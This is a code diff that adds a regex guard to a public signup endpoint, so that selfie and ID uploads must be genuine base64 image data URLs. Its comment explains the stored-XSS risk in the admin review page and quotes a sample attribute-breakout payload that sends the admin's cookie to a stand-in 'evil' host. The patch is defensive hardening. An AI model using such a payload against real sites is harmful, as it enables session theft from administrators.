@@ -913,6 +913,22 @@ app.post('/api/signup', signupLimiter, async (req, res) => {
         return res.status(400).json({ error: 'One or more images are too large (max 5 MB each).' });
     }
 
+    // ─ Image format guard — must be a genuine base64 image data URL. ─
+    // These fields are rendered directly into an <img src="..."> and an inline
+    // onclick handler in the admin review UI (admin.html: imgThumb()), with no
+    // further server-side sanitization at render time. Without this check, a
+    // caller hitting this public, unauthenticated endpoint directly (bypassing
+    // the signup form entirely) could submit a string like
+    // `" onerror="fetch('//evil/?c='+document.cookie)` and break out of the
+    // attribute, achieving stored XSS in an admin's authenticated session the
+    // moment they open the "review signup" modal. The client's `accept="image/*"`
+    // file-picker hint provides no protection against this since it never
+    // touches the raw request body. Same allow-list used by the scan endpoint.
+    const IMAGE_DATA_URL_RE = /^data:image\/(png|jpe?g|webp|gif);base64,[A-Za-z0-9+/=]+$/;
+    if (!IMAGE_DATA_URL_RE.test(selfieImage) || !IMAGE_DATA_URL_RE.test(idFrontImage) || !IMAGE_DATA_URL_RE.test(idBackImage)) {
+        return res.status(400).json({ error: 'Selfie and ID images must be valid image uploads (JPEG, PNG, WEBP, or GIF).' });
+    }
+
     // ─ Guard against reserved admin/teacher usernames ─
     const reservedUsernames = [process.env.ADMIN_USER || 'admin', process.env.TEACHER_USER || 'teacher'];
     if (reservedUsernames.includes(username.toLowerCase())) {
